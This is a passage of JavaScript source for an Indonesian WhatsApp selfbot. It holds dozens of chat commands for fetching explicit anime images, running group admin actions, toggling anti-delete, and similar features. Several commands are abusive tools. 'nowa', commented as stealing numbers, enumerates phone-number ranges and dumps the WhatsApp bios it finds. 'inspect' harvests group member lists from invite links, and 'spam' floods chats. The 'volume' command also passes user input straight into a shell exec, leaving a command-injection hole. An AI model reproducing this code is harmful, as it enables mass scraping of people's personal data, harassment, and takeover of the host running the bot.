if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=wallpaper&apikey=hardianto`)
kon = await getBuffer(hai)
Haikal.sendMessage(from, kon, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'neko2':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
kon = await getBuffer(hai)
Haikal.sendMessage(from, kon, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'baka':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=baka&apikey=hardianto`)
kon = await getBuffer(hai)
Haikal.sendMessage(from, kon, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'slap':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=slap&apikey=hardianto`)
kon = await getBuffer(hai)
Haikal.sendMessage(from, kon, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'poke':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=poke&apikey=hardianto`)
kon = await getBuffer(hai)
Haikal.sendMessage(from, kon, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'neko2':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=hardianto`)
kon = await getBuffer(hai)
Haikal.sendMessage(from, kon, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case 'keta':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=keta&apikey=hardianto`)
kon = await getBuffer(hai)
Haikal.sendMessage(from, kon, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case  'awoo':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
buffer = await getBuffer(anu.url)
Haikal.sendMessage(from, buffer, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case  'blowjob':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
buffer = await getBuffer(anu.url)
Haikal.sendMessage(from, buffer, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case  'hentai': 
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
Haikal.sendMessage(from, buffer, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case  'megumin':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
buffer = await getBuffer(anu.url)
Haikal.sendMessage(from, buffer, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case  'neko':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
Haikal.sendMessage(from, buffer, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
case  'trapnime':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik:🔥➥ ${prefix}nsfw 1 \nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
buffer = await getBuffer(anu.url)
Haikal.sendMessage(from, buffer, image, { quoted: ikal, thumbnail: fs.readFileSync('./stik/Ahhikal.jpg')})
break
//=================================================//
 // Anti Delete ( HW MODS WA )
 	case 'd':
					Haikal.deleteMessage(from, { id: kal.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
case 'antidelete':
if (isBan) return reply(mess.ban)
if (!isOwner && !kal.key.fromMe) return
if (args.length < 1) return freply('Pilih on atau off')
if (args[0] === "on") {
if (antidel === true) return
antidel = true
freply(` Succes mengaktifkan antidelete`)
} else if (args[0] === "off") {
if (antidel === false) return
antidel = false
freply(` Succes mematikan antidelete`)
} else {
freply(`Pilih on atau off`)
}
break
// Anti Call ( HW MODS WA )
case 'anticall':
if (isBan) return reply(mess.ban)
if (!isOwner && !kal.key.fromMe) return
if (args.length < 1) return freply('Pilih on atau off')
if (args[0] === "on") {
if (antical === true) return
antical = true
freply(` Succes mengaktifkan anticall`)
} else if (args[0] === "off") {
if (antical === false) return
antical = false
freply(` Succes mematikan anticall`)
} else {
freply(`Pilih on atau off`)
}
break
// Auto Read ( HW MODS WA )
case 'autoread':
if (isBan) return reply(mess.ban)
if (!isOwner && !kal.key.fromMe) return
if (args.length < 1) return freply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return freply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readG === true) return
readG = true
freply(` Succes mengaktifkan autoread group`)
} else if (args[1] === "off") {
if (readG === false) return
readG = false
freply(` Succes mematikan autoread group`)
} else {
freply(`Pilih on atau off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return freply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readP === true) return
readP = true
freply(` Succes mengaktifkan autoread pribadi`)
} else if (args[1] === "off") {
if (readP === false) return
readP = false
freply(` Succes mematikan autoread pribadi`)
} else {
freply(`Pilih on atau off`)
}
} else {
freply(`*List Auto Read*\n•> gc\n•> pc`)
}
break                  
    case 'antibug':
    if (isBan) return reply(mess.ban)
          if (!kal.key.fromMe && !isOwner) return
          if (args[0] === 'on') {
          if (bugc === true) return
          bugc = true
          antitrol = true
          freply('Berhasil menyalakan antibug')
          } else if (args[0] === 'off') {
          if (bugc === false) return
          bugc = false
          antitrol = false
          freply('Berhasil mematikan antibug')
          } else {
          freply('Pilih on atau off')
          }
          break
          // Set Cmd ( HW MODS WA )
case 'addcmd': 
case 'setcmd':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
if (isQuotedSticker) {
if (!q) return freply(`Penggunaan : ${command} cmdnya dan tag stickernya`)
var kodenya = kal.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
addCmd(kodenya, q)
freply("Done Bwang")
} else {
freply('tag stickenya')
}
break
// Del Cmd ( HW MODS WA )
case 'delcmd':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
if (!isQuotedSticker) return freply(`Penggunaan : ${command} tagsticker`)
var kodenya = kal.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString('base64')
scommand.splice(getCommandPosition(kodenya), 1)
fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
freply("Done Bwang")
break
// List Cmd ( HW MODS WA )
case 'listcmd':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
let teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``
let cemde = [];
for (let i of scommand) {
cemde.push(i.id)
teksnyee += `\n\n*•> ID :* ${i.id}\n*•> Cmd :* ${i.chats}`
}
freply(teksnyee)
break
// LIST MENU GROUP
case 'penjara':			
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
			if (!isGroup) return freply(mess.only.group)
				if (args.length < 1) return freply(`Penggunaan🔥➥ ${prefix}creategrup nama grup|@tag member`)
				argz = args.join('|')
				if (kal.message.extendedTextMessage != undefined){
                    mentioned = kal.message.extendedTextMessage.contextInfo.mentionedJid
                    for (let i = 0; i < mentioned.length; i++){
						anu = []
						anu.push(mentioned[i])
                    }
					Haikal.groupCreate(argz[0], anu)
					fakestatus(from, ` Sukses`, fake)
                }
				break	
// Leave Group ( HW MODS WA )
case 'leave':
if (isBan) return reply(mess.ban)
				if (!isOwner && !kal.key.fromMe) return
				Haikal.updatePresence(from, Presence.composing)
				Haikal.groupLeave(from)
						break
    case 'inspect':
    if (isBan) return reply(mess.ban)
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return freply(mess.Iv)
            if (!q) return freply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return freply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await Haikal.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             Haikal.sendMessage(from,par,text,{quoted:ikal,contextInfo:{mentionedJid:jids}})
             } catch {
             freply('Link error')
             }
             break
// List Group
case 'listgroup':
case 'listgrup':
case 'listgrop':
case 'gruplist':
case 'groplist':
case 'grouplist':
if (isBan) return reply(mess.ban)
const txs = Haikal.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`•> ${Haikal.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n~~\n`
Haikal.sendMessage(m.chat, '```「 List Groups 」```\n\n' + txs, text)
break
// Search Text ( HW MODS WA )
case 'searchtext':
if (args.length < 1) return freply(`${a}Wrong Format${a} What Message Are You Looking For Bro??\Example :🔥➥ ${prefix}searchtext halo|10`)
tekse = args.join('')
if (tekse.includes("|")) { 
try {
var ve = tekse.split("|")[0]
var za = tekse.split("|")[1]
if (za > 15) return freply('minimum 15')
sampai = `${za}`
batas = parseInt(sampai) + 1
cok = await Haikal.searchMessages(`${ve}`, from, batas,1) 
if (cok.messages.lenght < 2) return freply('Message Not Found') 
if (cok.messages.length < parseInt(batas)) freply(`Found Only ${cok.messages.length - 1} Messages`)
for (let i=1;i < cok.messages.length;i++) {
if (cok.messages[i].message) {
Haikal.sendMessage(from, `Here The Message!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
return freply(`${a}ERROR${a} An error occurred while searching for Messages`)
}
} else {
freply(`Wrong format, this is an example of the correct format :🔥➥ ${prefix}searchtext halo|15`)
}
break
// Group Open / Close ( HW MODS WA )
case 'group':
if (isBan) return reply(mess.ban)
if (!isOwner && !kal.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
if (!isBotGroupAdmins) return freply('Bot not admin')
if (!isGroup) return
if (args[0] === 'open') {
freply(`* Succes OPEN GROUP*`)
Haikal.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'close') {
freply(`* Succes CLOSE GROUP*`)
Haikal.groupSettingChange(from, GroupSettingChange.messageSend, true)
}
break
// Set Description Group ( HW MODS WA )
case 'setdesc':
if (isBan) return reply(mess.ban)
if (!isOwner && !kal.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
if (!isBotGroupAdmins) return freply('Bot not admin')
if (!isGroup) return
Haikal.groupUpdateDescription(from, `${args.join(" ")}`)
Haikal.sendMessage(from, ' Succes change description group', text, {quoted:ikal})
break
// Set Name Group ( HW MODS WA )
case 'setname':
if (isBan) return reply(mess.ban)
if (!isOwner && !kal.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
if (!isBotGroupAdmins) return freply('Bot not admin')
if (!isGroup) return
Haikal.groupUpdateSubject(from, `${args.join(" ")}`)
Haikal.sendMessage(from, ' Succes change name group', text, {quoted:ikal})
break
// Group Info ( HW MODS WA )
case 'groupinfo':
if (isBan) return reply(mess.ban)
if (!isGroup) return
ppUrl = await Haikal.getProfilePicture(from) // leave empty to get your own
buffergbl = await getBuffer(ppUrl)
Haikal.sendMessage(from, buffergbl, image, {quoted: ikal, caption: `\`\`\`「 Group Info 」\`\`\`\n*•> Name* : ${groupName}\n*•> Member* : ${groupMembers.length}\n*•> Admin* : ${groupAdmins.length}\n*•> Description* : \n${groupDesc}`})
break
// Demote Admins ( HW MODS WA )
case 'demote':
if (isBan) return reply(mess.ban)
if (!isOwner && !kal.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
if (!isGroup) return
if (!isBotGroupAdmins) return freply('Bot not admin')
if (kal.message.extendedTextMessage === undefined || kal.message.extendedTextMessage === null) return freply('Reply members')
mentionede = kal.message.extendedTextMessage.contextInfo.participant
Haikal.groupDemoteAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]}  Succes demote`
Haikal.sendMessage(from, teks, text, {quoted:ikal, contextInfo:{mentionedJid:[mentionede]}})
break
case 'listadmin':
	                if (!kal.key.fromMe) return fakestatus('SELF-BOT')
					if (!isGroup) return reply(mess.only.group)
					teks = `List admin of group *${groupMetadata.subject}*\n𝗧𝗼𝘁𝗮𝗹 : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
// Promote Members ( HW MODS WA )
case 'promote':
if (isBan) return reply(mess.ban)
if (!isOwner && !kal.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
if (!isGroup) return
if (!isBotGroupAdmins) return freply('Bot not admin')
if (kal.message.extendedTextMessage === undefined || kal.message.extendedTextMessage === null) return freply('Reply members')
mentionede = kal.message.extendedTextMessage.contextInfo.participant
Haikal.groupMakeAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]}  Succes promote`
Haikal.sendMessage(from, teks, text, {quoted:ikal, contextInfo:{mentionedJid:[mentionede]}})
break
// Revoke Link Group ( HW MODS WA )
case 'revoke':
if (isBan) return reply(mess.ban)
if (!kal.key.fromMe && !isOwner && !isGroupAdmins) return freply('Admin Group Only')
if (!isBotGroupAdmins) return freply('Bot not admin')
if (!isGroup) return
Haikal.revokeInvite(from)
freply('``` Succes revoke link group```')
break
// Link Group ( HW MODS WA )
case 'linkgc':
case 'linkgrup':
case 'linkgrop':
case 'linkgroup':
if (isBan) return reply(mess.ban)
if (!isGroup) return
if (!isBotGroupAdmins) return freply('Bot not admin')
linkgc = await Haikal.groupInviteCode(from)
yeh = `\`\`\`「 Link Group 」\`\`\`\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n_Nyo bisa nyo ramein_`
Haikal.sendMessage(from, yeh, text, { quoted: ikal })
break
// Add Members ( HW MODS WA )
case 'add':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
if (!isOwner && !kal.key.fromMe && !isGroupAdmins) return freply('Admin Group Only')
if (!isBotGroupAdmins) return freply('Bot not admin!')
if (!isGroup) return
if (args.length < 1) return freply(`what's the number?`)
freply('HELLO !!! DI GROUP KAMI ')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
Haikal.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
freply('HELLO !!! DI GROUP KAMI ')
}
break
// kick Anggota group
case 'kick':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (isBan) return reply(mess.ban)
if (!isGroup) return freply(mess.only.group)
if (!isGroupAdmins && !kal.key.fromMe && !isOwner) return freply('Admin Group Only')
if (!isBotGroupAdmins) return freply('Bot not admin')
			if (kal.message.extendedTextMessage === undefined || kal.message.extendedTextMessage === null) return freply('𝗧𝗮𝗴 𝘁𝗮𝗿𝗴𝗲𝘁 ??𝗮𝗻𝗴 𝗶𝗻𝗴𝗶𝗻 𝗱𝗶 𝘁𝗲𝗻𝗱𝗮𝗻𝗴!')
					mentioned = kal.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `╭────────────────⊱
║> *ASEK DAPAT JATAH KICK*
╰────────────────⊱
 🤭 :\n`
							teks += `@_.split('@')[0]`
						}
						freply(teks, mentioned, true)
						Haikal.groupRemove(from, mentioned)
					} else {
						freply(`╭────────────────⊱
║> *KASIAN KENA KICK*
╰────────────────⊱
 @${mentioned[0].split('@')[0]} 🤭`, mentioned, true)
						Haikal.groupRemove(from, mentioned)
					}
					break
					// Search Gc ( HW MODS WA  )
case 'searchgc':
if (isBan) return reply(mess.ban)
if (args.length < 1) return freply(`Example :\n${prefix}searchgc Editor Berkelas`)
nae = args.join(" ")
hx.linkwa(nae).then(res => {
teks = '```「 Search Group 」```'
for (let i of res) {
teks += `\n\n•> Group Whatsapp :\n`
teks += `${i.link}\n`
teks += `${i.nama}`
}
freply(teks)
})
break
case 'ban':
if (isBan) return reply(mess.ban)
if (!kal.key.fromMe && !isOwner) return
if (!isQuotedReply) return reply(`Reply orangnya`)
orgnye = kal.message.extendedTextMessage.contextInfo.participant
const isBane = banUser.includes(orgnye)
if (args[0] === "add") {
if (isBane) return reply('User sudah dibanned')
banUser.push(orgnye)
fs.writeFileSync('./database/banned.json', JSON.stringify(banUser))
Haikal.sendMessage(from, `User @${orgnye.split("@")[0]}, berhasil dibanned`, text, {quoted:ikal, contextInfo:{mentionedJid:[orgnye]}})
Haikal.sendMessage(`6285714170944@s.whatsapp.net`, `\`\`\`「 Banned 」\`\`\`\n•> Nomer : @${orgnye.split("@")[0]}\n•> Command : Banned`, text, {quoted:ikal, contextInfo:{mentionedJid:[orgnye]}})
} else if (args[0] === "del") {
if (!isBane) return reply('User tidak dibanned')
let delbans = banUser.indexOf(orgnye)
banUser.splice(delbans, 1)
fs.writeFileSync('./database/banned.json', JSON.stringify(banUser))
Haikal.sendMessage(from, `User @${orgnye.split("@")[0]}, berhasil diunban`, text, {quoted:ikal, contextInfo:{mentionedJid:[orgnye]}})
Haikal.sendMessage(`6285714170944@s.whatsapp.net`, `\`\`\`「 Banned 」\`\`\`\n•> Nomer : @${orgnye.split("@")[0]}\n•> Command : Unbanned`, text, {quoted:ikal, contextInfo:{mentionedJid:[orgnye]}})
} else {
reply('Pilih add atau del')
}
break
// Get Pic ( HW MODS WA )
case 'getp':
if (isBan) return reply(mess.ban)
try {
pic = await Haikal.getProfilePicture(from)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
Haikal.sendMessage(from, thumb, MessageType.image, {quoted: ikal, caption: "Nih kak..."})
break
// Get Pic ( HW MODS WA )
case 'getpic':
if (isBan) return reply(mess.ban)
if (kal.message.extendedTextMessage != undefined){
mentioned = kal.message.extendedTextMessage.contextInfo.participant
try {
pic = await Haikal.getProfilePicture(mentioned)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
Haikal.sendMessage(from, thumb, MessageType.image, {quoted: ikal, caption: "Nih kak..."})
} else if (args[0]) {
try {
pic = await Haikal.getProfilePicture(args[0])
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
Haikal.sendMessage(from, thumb, MessageType.image, {quoted: ikal, caption: "Nih kak..."})
} else {
freply(`Example :\n${prefix}${command} 62xxx\n${prefix}${command} <reply>`)
}
break
// Get Bio ( HW MODS WA )
case 'getbio':
var yy = kal.message.extendedTextMessage.contextInfo.participant
var p = await Haikal.getStatus(`${yy}`, MessageType.text)
freply(p.status)
if (p.status == 401) {
freply("Status Profile Not Found")
}
break
// Get Name ( HW MODS WA )
case 'getname':
var ambl = kal.message.extendedTextMessage.contextInfo.participant
const sname = Haikal.contacts[ambl] != undefined ? Haikal.contacts[ambl].sname || Haikal.contacts[ambl].notify : undefined
freply(sname)
break
// Restart Bot ( HW MODS WA )
case 'restart':
if (!kal.key.fromMe && !isOwner) return
freply('Restart...')
await exec(`pm2 restart main`, (err, stdout) => {
if (err) return Haikal.sendMessage(from, `${err}`, text, { quoted: ikal })
if (stdout) {
console.log('Restart...')
}
})
console.log(stdout)
break
// Kalkulator ( HW MODS WA )
case 'kalkulator':
if (args.length < 1) return freply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
freply('Error')
} else {
freply(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
break
// Set Prefix ( HW MODS WA )
case 'setprefix':
if (!kal.key.fromMe) return fakestatus('APASIH')
if (args.length < 1) return freply(`Example:\n•>🔥➥ ${prefix}setprefix multi\n•>🔥➥ ${prefix}setprefix <query>`)
if (args[0] === 'multi') {
if (multi === true) return
multi = true
freply(`\`\`\` Succes change prefix =「 Multi Prefix 」\`\`\``)
} else {
multi = false
pref = args[0]
freply(`\`\`\` Succes change prefix =「 ${args[0]} 」\`\`\``)
}
break
//Nsfw
 case 'nsfw':
	        if (!isGroup) return freply(mess.only.group)
if (!isGroupAdmins && !kal.key.fromMe && !isOwner) return freply('Admin Group Only')
if (!isBotGroupAdmins) return freply('Bot not admin')
if (args.length < 1) return freply('ketik 1 untuk mengaktifkan\nketik 0 untuk menonaktifkan')
if (args[0] === "1") {
						if (isNsfw) return reply('Sudah Aktif Kak')
						nsfww.push(from)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Sukses mengaktifkan fitur nsfw')
						Haikal.sendMessage(from, `Bebas Nyari Hentai :v`, text)
					} else if (Number(args[0]) === 0) {
						if (!isNsfw) return reply('Sudah Mati Kak')
						var ini = nsfww.indexOf(from)
						nsfww.splice(ini, 1)
						fs.writeFileSync('./database/nsfww.json', JSON.stringify(nsfww))
						reply('Sukses menonaktifkan fitur nsfw')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk mematikan')
					}
					break
// Colong Nomor Yok
case 'nowa':
if (!kal.key.fromMe) return fakestatus('APASIH')
                var teks = body.slice(6)
                if (!teks) return freply("lah?")
                var numberPattern = /\d+/g;
                var nomer = teks.match(numberPattern)
                var random_length = teks.length - nomer[0].length;
                if (random_length == 1) {
                    var random = 10
                } else if (random_length == 2) {
                    var random = 100
                } else if (random_length == 3) {
                    var random = 1000
                } else if (random_length == 4) {
                    var random = 10000
                }
                console.log(random)
                var nomerny = `List Nomer\n`
                for (let i = 0; i < random; i++) {
                    var nu = ['1','2','3','4','5','6','7','8','9']
                    var dom1 = nu[Math.floor(Math.random() * nu.length)]
                    var dom2 = nu[Math.floor(Math.random() * nu.length)]
                    var dom3 = nu[Math.floor(Math.random() * nu.length)]
                    var dom4 = nu[Math.floor(Math.random() * nu.length)]
                    if (random_length == 1) {
                        var rndm = `${dom1}`
                        var gdaftar = []
                    } else if (random_length == 2) {
                        rndm = `${dom1}${dom2}`
                    } else if (random_length == 3) {
                        rndm = `${dom1}${dom2}${dom3}`
                    } else if (random_length == 4) {
                        rndm = `${dom1}${dom2}${dom3}${dom4}`
                    }
                    var anu = await Haikal.isOnWhatsApp(`${nomer[0]}${i}@s.whatsapp.net`);
                    var bionye = await Haikal.getStatus(`${nomer[0]}${i}@s.whatsapp.net`);
                    var anuu = anu ? anu : false;
                    try {
                        if (nomerny.includes(anu.jid.split("@")[0])) {
                            //console.log(i)
                        } else {
                            nomerny += `NO: wa.me/${anu.jid.split("@")[0]}\nBIO: ${bionye.status}\n\n`
                        }
                    } catch {
                        console.log(i)
                    }
                }
                freply(nomerny)
                console.log("Done dump")
				break
// Voice Google 
case 'tts':
					if (args.length < 1) return Haikal.sendMessage(from, `Kode bahasanya mana kak? contoh :🔥➥ ${prefix}tts id yamate kudasai`, text, { quoted: ikal })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return Haikal.sendMessage(from, `Teksnya mana kak? contoh :🔥➥ ${prefix}tts id yamate kudasai`, text, { quoted: ikal })
					var bby = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					bby.length > 300
						? freply('Teks nya terlalu panjang kak')
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								fs.unlinkSync(ranm)
								buff = fs.readFileSync(rano)
								if (err) return freply(dla.stikga())
								Haikal.sendMessage(from, buff, audio, {  ptt: true, quoted: ikal })
								fs.unlinkSync(rano)
							})
						})
					break
// Fake Size ( HW MODS WA )
case 'size':
if (args.length < 1) return freply('Masukan angkanya')
filsize = args[0]
costick = await Haikal.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
"fileSha256": m.quoted.fileSha256.toString('base64'),
"fileEncSha256": m.quoted.fileEncSha256.toString('base64'),
"mediaKey": m.quoted.mediaKey.toString('base64'),
"mimetype": m.quoted.mimetype,
"height": m.quoted.height,
"width": m.quoted.width,
"directPath": m.quoted.directPath,
"fileLength": filsize,
"mediaKeyTimestamp": m.quoted.mediaKeyTimestamp.low,
"isAnimated": m.quoted.isAnimated
}
}, {quoted:ikal})
Haikal.relayWAMessage(costick)
break
// Spam Chat ( HW MODS WA )
case 'spam':
if (!isOwner && !kal.key.fromMe) return
if (!m.quoted) return freply(`reply pesanya`)
if (args.length < 1) return freply(`Example :\n${prefix}spam 15`)
if (args[0] > 100) return freply(`Maximal 100`)
let jml = args[0]
for(let i=0;i<jml;i++){
m.quoted.copyNForward(m.chat, true)
}
break
// Stop Jadibot ( HW MODS WA & Vean  )
case 'stopbot':
stopjadibot(Haikal, from, sender, kal)
break
// Jadibot ( HW MODS WA & Vean  )
case 'jadibot':
if (!isOwner) return freply(`_Silahkan Hubungi Owner Untuk Memakai Fitur Ini_`)
jadibot(Haikal, from, sender, reply, kal)
break
// Antitag On / Off ( HW MODS WA )
case 'antitag':
if (!kal.key.fromMe && !isOwner) return
if (args.length < 1) return freply(`Ketik on untuk mengaktifkan\nKetik off untuk menonaktifkan`)
if (args[0] === 'on') {
if (antitags === true) return
antitags = true
freply(`Berhasil mengaktifkan antitag!`)
} else if (args[0] === 'off') {
if (antitags === false) return
antitags = false
freply(`Berhasil menonaktifkan antitag!`)
} else {
freply('Pilih on atau off')
}
break
// Volume Audio ( HW MODS WA )
case 'volume':
if (!isQuotedAudio) return freply('Reply audio!')
encmedia = JSON.parse(JSON.stringify(kal).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await Haikal.downloadAndSaveMediaMessage(encmedia)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return freply('Error!')
jadie = fs.readFileSync(rname)
Haikal.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: ikal})
